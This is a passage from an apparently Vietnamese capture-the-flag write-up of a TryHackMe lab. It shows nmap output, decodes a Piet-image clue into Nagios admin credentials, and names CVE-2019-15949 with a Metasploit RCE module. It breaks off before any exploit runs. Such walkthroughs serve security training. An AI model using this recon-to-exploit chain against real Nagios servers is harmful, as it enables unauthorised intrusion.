+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="nb">type</span><span class="p">:</span> <span class="n">rsa</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">bits</span><span class="p">:</span> <span class="mi">2048</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Signature</span> <span class="n">Algorithm</span><span class="p">:</span> <span class="n">sha256WithRSAEncryption</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">23</span><span class="n">T23</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">04</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2030</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">21</span><span class="n">T23</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">04</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">MD5</span><span class="p">:</span>   <span class="mi">9</span><span class="n">b85</span><span class="p">:</span><span class="mi">15</span><span class="n">ad</span><span class="p">:</span><span class="mi">46</span><span class="n">a7</span><span class="p">:</span><span class="mi">016</span><span class="n">e</span><span class="p">:</span><span class="mi">319</span><span class="n">a</span><span class="p">:</span><span class="mi">033</span><span class="n">d</span><span class="p">:</span><span class="mi">7</span><span class="n">d96</span><span class="p">:</span><span class="n">edbe</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">c488</span><span class="p">:</span><span class="mi">0</span><span class="n">c2d</span><span class="p">:</span><span class="n">a210</span><span class="p">:</span><span class="mi">38</span><span class="n">dd</span><span class="p">:</span><span class="n">cfbb</span><span class="p">:</span><span class="n">a299</span><span class="p">:</span><span class="mi">4</span><span class="n">a2a</span><span class="p">:</span><span class="n">b69c</span><span class="p">:</span><span class="mi">63</span><span class="n">fd</span><span class="p">:</span><span class="mi">2</span><span class="n">cdc</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">MIICsjCCAZqgAwIBAgIJAMztBzdUafrfMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">BAMMBnVidW50dTAeFw0yMDAzMjMyMzQyMDRaFw0zMDAzMjEyMzQyMDRaMBExDzAN</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM4f</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Mj</span><span class="o">+</span><span class="mi">6</span><span class="n">LmA7krMf32EdXKtdfPVFVFf3367a</span><span class="o">+</span><span class="n">trh4</span><span class="o">/</span><span class="n">H6MHZJVOpZ</span><span class="o">+</span><span class="n">CrH1j4RTjr9SONC</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">l5Fzrz1hR1o1oXIwsAXrtqcvYGeNT7gwH4D6m6zifSaOAWEy</span><span class="o">/</span><span class="n">IMsbe3</span><span class="o">+</span><span class="n">sPMIUPlS</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">4</span><span class="n">NdFl4J6PeyeAAnShUzAOAdUqsvSsAmmvN3ze</span><span class="o">+</span><span class="n">Y2OGGfOlO1s7n25FDs72zXo2nX</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">i1EO</span><span class="o">+</span><span class="mi">1</span><span class="n">mVdUWuM</span><span class="o">/</span><span class="n">Qr8Zctilwv9QNPWxcoTG</span><span class="o">/</span><span class="n">Zac</span><span class="o">/</span><span class="n">q8</span><span class="o">/</span><span class="n">pboWaUg3pf6mfFLbwo96ba</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">8</span><span class="n">p8QR8gfD1Vc1xQMN98</span><span class="o">/</span><span class="mi">2</span><span class="n">lPxo8ISkW9ffcBzy0ILIhkSD</span><span class="o">/</span><span class="mi">8</span><span class="n">EmynmC7FhgogCU</span><span class="o">+/</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">fYpeC3wLLigkDZnOgL0CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">AAOCAQEABDjkkOLVJfqNq1qSDGBgu7IJCG1CAByl82DGlam2nsVBhji54hviiyBi</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">euCyeqJRPOX2qS7Kl0scMFw</span><span class="o">+</span><span class="n">DVxNW867HcrtTYEHuo1gOCGX3QFz</span><span class="o">+</span><span class="n">eUuKf</span><span class="o">+</span><span class="mi">4</span><span class="n">X1Wr</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">a7VgSeYVhboT4w4tKm8Rprh7QkHp9MNTB9TR</span><span class="o">/</span><span class="n">edG9RtFJZXtSlykeS5lLeC3DjRw</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">0</span><span class="n">NhWpgG2ZLa9URDrpzErvVwOBN46IS0PqwDCxJSvsH6sBQhgrm5so71jrPHwmh</span><span class="o">/</span><span class="n">o</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">aaqO96Rw</span><span class="o">+</span><span class="mi">1</span><span class="n">aRRLwz0O0TEO4aMw8</span><span class="o">/</span><span class="n">seeiRJ8w4kXMOy9UrCM5</span><span class="o">+</span><span class="n">yW6fbtMKYsmEPJO</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">RxSanrURYb9UJxdRfeWPqWYU1AHVwg</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span><span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_smtp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">ERROR</span><span class="p">:</span> <span class="n">Script</span> <span class="n">execution</span> <span class="n">failed</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">d</span> <span class="n">to</span> <span class="n">debug</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_smtp</span><span class="o">-</span><span class="n">commands</span><span class="p">:</span> <span class="n">ubuntu</span><span class="o">.</span><span class="n">localdomain</span><span class="p">,</span> <span class="n">PIPELINING</span><span class="p">,</span> <span class="n">SIZE</span> <span class="mi">10240000</span><span class="p">,</span> <span class="n">VRFY</span><span class="p">,</span> <span class="n">ETRN</span><span class="p">,</span> <span class="n">STARTTLS</span><span class="p">,</span> <span class="n">ENHANCEDSTATUSCODES</span><span class="p">,</span> <span class="mi">8</span><span class="n">BITMIME</span><span class="p">,</span> <span class="n">DSN</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="n">TLS</span> <span class="n">randomness</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">represent</span> <span class="n">time</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>       <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.18</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">POST</span> <span class="n">OPTIONS</span> <span class="n">GET</span> <span class="n">HEAD</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">&#39;t have a title (text/html).</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.18</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>       <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="n">OpenLDAP</span> <span class="mf">2.2</span><span class="o">.</span><span class="n">X</span> <span class="o">-</span> <span class="mf">2.3</span><span class="o">.</span><span class="n">X</span>
+</span></span><span class="line"><span class="cl"><span class="mi">443</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">http</span>   <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.18</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">http</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="mf">192.168.85.153</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Nagios</span> <span class="n">Enterprises</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">Minnesota</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">US</span><span class="o">/</span><span class="n">organizationalUnitName</span><span class="o">=</span><span class="n">Development</span><span class="o">/</span><span class="n">localityName</span><span class="o">=</span><span class="n">St</span><span class="o">.</span> <span class="n">Paul</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Issuer</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="mf">192.168.85.153</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Nagios</span> <span class="n">Enterprises</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">Minnesota</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">US</span><span class="o">/</span><span class="n">organizationalUnitName</span><span class="o">=</span><span class="n">Development</span><span class="o">/</span><span class="n">localityName</span><span class="o">=</span><span class="n">St</span><span class="o">.</span> <span class="n">Paul</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="nb">type</span><span class="p">:</span> <span class="n">rsa</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">bits</span><span class="p">:</span> <span class="mi">2048</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Signature</span> <span class="n">Algorithm</span><span class="p">:</span> <span class="n">sha1WithRSAEncryption</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">24</span><span class="n">T00</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">58</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2030</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">22</span><span class="n">T00</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">58</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">MD5</span><span class="p">:</span>   <span class="mi">636</span><span class="n">c</span><span class="p">:</span><span class="n">ab0f</span><span class="p">:</span><span class="mi">6399</span><span class="p">:</span><span class="mf">34e3</span><span class="p">:</span><span class="n">b6de</span><span class="p">:</span><span class="n">e6e2</span><span class="p">:</span><span class="n">b294</span><span class="p">:</span><span class="n">d4ef</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="mi">80</span><span class="n">cd</span><span class="p">:</span><span class="mf">2e1</span><span class="n">b</span><span class="p">:</span><span class="mi">110</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">b5f</span><span class="p">:</span><span class="mi">1943</span><span class="p">:</span><span class="mi">1</span><span class="n">b3f</span><span class="p">:</span><span class="n">c218</span><span class="p">:</span><span class="mf">71e7</span><span class="p">:</span><span class="mi">8</span><span class="n">b98</span><span class="p">:</span><span class="mi">6801</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">MIIDzTCCArWgAwIBAgIBADANBgkqhkiG9w0BAQUFADCBgDELMAkGA1UEBhMCVVMx</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">EjAQBgNVBAgMCU1pbm5lc290YTERMA8GA1UEBwwIU3QuIFBhdWwxGzAZBgNVBAoM</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Ek5hZ2lvcyBFbnRlcnByaXNlczEUMBIGA1UECwwLRGV2ZWxvcG1lbnQxFzAVBgNV</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">BAMMDjE5Mi4xNjguODUuMTUzMB4XDTIwMDMyNDAwMTQ1OFoXDTMwMDMyMjAwMTQ1</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">OFowgYAxCzAJBgNVBAYTAlVTMRIwEAYDVQQIDAlNaW5uZXNvdGExETAPBgNVBAcM</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">CFN0LiBQYXVsMRswGQYDVQQKDBJOYWdpb3MgRW50ZXJwcmlzZXMxFDASBgNVBAsM</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">C0RldmVsb3BtZW50MRcwFQYDVQQDDA4xOTIuMTY4Ljg1LjE1MzCCASIwDQYJKoZI</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">hvcNAQEBBQADggEPADCCAQoCggEBANdnw2CkJpNnnwjJ</span><span class="o">+</span><span class="n">PaxonTH</span><span class="o">/</span><span class="n">G5TSKLru67c</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">aQyy4FhI</span><span class="o">/</span><span class="n">xa</span><span class="o">+</span><span class="mi">0</span><span class="n">Dwn</span><span class="o">/</span><span class="n">HjWnWIOE3gOQB7QyOyG30guUpFohUEtC9agL7tpogpxrV8l</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ie0vhXsz0ETdzMhaou6QOrLS1OSspAh</span><span class="o">+</span><span class="n">t492t71BILl6ReHPLoFyEghyRctP</span><span class="o">/</span><span class="n">iK0</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">PelUJKndJ2ElpLdbkMUuVzQ9mp8qIjoTF4CS1JwiUESCtikRmZWp398buklzNGgF</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">VZIRJPu5VZMPGc7Ui3QUSaTF2aqi9FRXZRXN</span><span class="o">+</span><span class="mi">0</span><span class="n">q2nWvdUFrUqnzrmaVynOupGXhS</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">O17VZtC9F</span><span class="o">/</span><span class="n">GM</span><span class="o">+</span><span class="n">yWpg3Lck9wevt5o3nnYW4k8h5kDNHu4f0oDR88CAwEAAaNQME4w</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">HQYDVR0OBBYEFFRhBQ3MZkrfjRqOlHjApJZAN</span><span class="o">+</span><span class="n">juMB8GA1UdIwQYMBaAFFRhBQ3M</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ZkrfjRqOlHjApJZAN</span><span class="o">+</span><span class="n">juMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEB</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ABeWyFzGfxf3vmGuLXdDXVj5e1LwBlvoNmHGf11Buy</span><span class="o">/</span><span class="n">yljpUI6jg1HxUTSABU</span><span class="o">/</span><span class="n">iS</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ZSsCnwOQ5dtqRAIcvFp07ZlUw9DpeSChj2jxXw</span><span class="o">+</span><span class="n">YxINOSqqNgE66zelXV9rJb7TX</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">HWho2</span><span class="o">/</span><span class="n">g6OzKs5ii2h5lyjlValQAgfxBYJpRjvf4FfIJpzL</span><span class="o">+</span><span class="n">RnrsOqJBNUurbAn1L</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">yNkqSDJhCPNN</span><span class="o">/</span><span class="n">g0V6eyOZRjTipV2FzcHYrbt84qFPN8gQ5Rpd6wNOWoUfuY1tL6H</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">yepaZ</span><span class="o">/</span><span class="n">iLv</span><span class="o">+</span><span class="n">wY60Kxd8</span><span class="o">+</span><span class="n">GD4Oy7Tpz</span><span class="o">+</span><span class="n">Ilkr48EIUffejHzVrcn7JikS8</span><span class="o">+</span><span class="n">Uf8nvDi9Q</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">LnC7LykFocxS13IXPcTfrnI</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span><span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="mi">400</span> <span class="n">Bad</span> <span class="n">Request</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.18</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">HEAD</span> <span class="n">POST</span> <span class="n">OPTIONS</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="n">TLS</span> <span class="n">randomness</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">represent</span> <span class="n">time</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">tcpwrapped</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span>  <span class="n">ubuntu</span><span class="o">.</span><span class="n">localdomain</span><span class="p">;</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span></span></span></code></pre></div></div>
+<p>Có khá nhiều port đang mở, nhưng tôi sẽ thử đi qua các port của web service trước là 80 và 443. Truy cập vào trang web, tôi nhận được một vài gợi ý (hoặc ít nhất là tôi nghĩ vậy)</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">					Welcome to elements.
+</span></span><span class="line"><span class="cl">				Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr</span></span></code></pre></div></div>
+<p>Có thể nhận ra ngay đây là các ký hiệu đại diện của các nguyên tố trong bảng tuần hoàn hóa học. Mỗi nguyên tố đều có số hiệu nguyên tử riêng. Tôi có thể dựa vào nó để tạo ra 1 dãy số mới</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">				Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
+</span></span><span class="line"><span class="cl">				47   80   73   51   84   46   80   78   103</span></span></code></pre></div></div>
+<p>Convert dãy số trên thành ascii, tôi có hidden file</p>
+<p><em><strong>PI3T.</strong></em></p>
+<p>Tải file ảnh này về và dùng exiftool để phân tích</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c1"># exiftool Downloads/PI3T. </span>
+</span></span><span class="line"><span class="cl"><span class="n">ExifTool</span> <span class="n">Version</span> <span class="n">Number</span>         <span class="p">:</span> <span class="mf">12.57</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">PI3T</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Directory</span>                       <span class="p">:</span> <span class="n">Downloads</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Size</span>                       <span class="p">:</span> <span class="mi">982</span> <span class="n">kB</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Modification</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">21</span> <span class="mi">13</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">34</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Access</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>           <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">21</span> <span class="mi">13</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">34</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Inode</span> <span class="n">Change</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">21</span> <span class="mi">13</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">34</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Permissions</span>                <span class="p">:</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Type</span>                       <span class="p">:</span> <span class="n">PNG</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Type</span> <span class="n">Extension</span>             <span class="p">:</span> <span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">MIME</span> <span class="n">Type</span>                       <span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">Image</span> <span class="n">Width</span>                     <span class="p">:</span> <span class="mi">990</span>
+</span></span><span class="line"><span class="cl"><span class="n">Image</span> <span class="n">Height</span>                    <span class="p">:</span> <span class="mi">990</span>
+</span></span><span class="line"><span class="cl"><span class="n">Bit</span> <span class="n">Depth</span>                       <span class="p">:</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Color</span> <span class="n">Type</span>                      <span class="p">:</span> <span class="n">Palette</span>
+</span></span><span class="line"><span class="cl"><span class="n">Compression</span>                     <span class="p">:</span> <span class="n">Deflate</span><span class="o">/</span><span class="n">Inflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Filter</span>                          <span class="p">:</span> <span class="n">Adaptive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Interlace</span>                       <span class="p">:</span> <span class="n">Noninterlaced</span>
+</span></span><span class="line"><span class="cl"><span class="n">Palette</span>                         <span class="p">:</span> <span class="p">(</span><span class="n">Binary</span> <span class="n">data</span> <span class="mi">768</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">b</span> <span class="n">option</span> <span class="n">to</span> <span class="n">extract</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Transparency</span>                    <span class="p">:</span> <span class="p">(</span><span class="n">Binary</span> <span class="n">data</span> <span class="mi">256</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">b</span> <span class="n">option</span> <span class="n">to</span> <span class="n">extract</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Artist</span>                          <span class="p">:</span> <span class="n">Piet</span> <span class="n">Mondrian</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span>                       <span class="p">:</span> <span class="n">Piet</span> <span class="n">Mondrian</span><span class="p">,</span> <span class="n">tryhackme</span> <span class="mi">2020</span>
+</span></span><span class="line"><span class="cl"><span class="n">Image</span> <span class="n">Size</span>                      <span class="p">:</span> <span class="mi">990</span><span class="n">x990</span>
+</span></span><span class="line"><span class="cl"><span class="n">Megapixels</span>                      <span class="p">:</span> <span class="mf">0.980</span></span></span></code></pre></div></div>
+<p>Ở đây tôi có người tạo ra file này</p>
+<p><strong><em>Piet Mondrian</em></strong></p>
+<p>Tiếp theo tôi cần convert file ảnh này sang ppm. Có thể dùng các web convert trên mạng ví dụ như <a href="https://convertio.co/"  target="_blank" rel="noreferrer">Convertio — File Converter</a></p>
+<p>Mất một lúc tìm kiếm xung quanh cái tên Piet và ppm format thì tôi tìm được một công cụ, hay đúng hơn là <a href="http://www.bertnase.de/npiet/"  target="_blank" rel="noreferrer">ngôn ngữ lập trình màu sắc</a></p>
+<p>Tải nó về và giải nén</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c1"># ./npiet /Downloads/PI3T.ppm</span>
+</span></span><span class="line"><span class="cl"><span class="n">nagiosadmin</span><span class="o">%</span><span class="n">n3p3UQ</span><span class="o">&amp;</span><span class="mi">9</span><span class="n">BjLp4</span><span class="err">$</span><span class="mi">7</span><span class="n">uhWdYnagiosadmin</span><span class="o">%</span><span class="n">n3p3UQ</span><span class="o">&amp;</span><span class="mi">9</span><span class="n">BjLp4</span><span class="err">$</span><span class="mi">7</span><span class="n">uhWdYnagiosadmin</span></span></span></code></pre></div></div>
+<p>username: <strong><em>nagiosadmin</em></strong>
+password: <strong><em>n3p3UQ&amp;9BjLp4$7uhWdY</em></strong></p>
+<p>Thử truy cập nagios</p>
+<p>Ngay trên trang chủ của Nagios có hiện phiên bản hiện tại là 4.4.2. Thử tìm các lỗ hổng với Nagios 4.4.2 và tôi tìm thấy <strong><em>CVE-2019-15949</em></strong></p>
+<p>Sử dụng Metasploit để tìm CVE này, tôi tìm được module</p>
+<p><strong><em>exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce)</em></strong></p>
+<p>Cấu hình các thông số trong exploit</p>
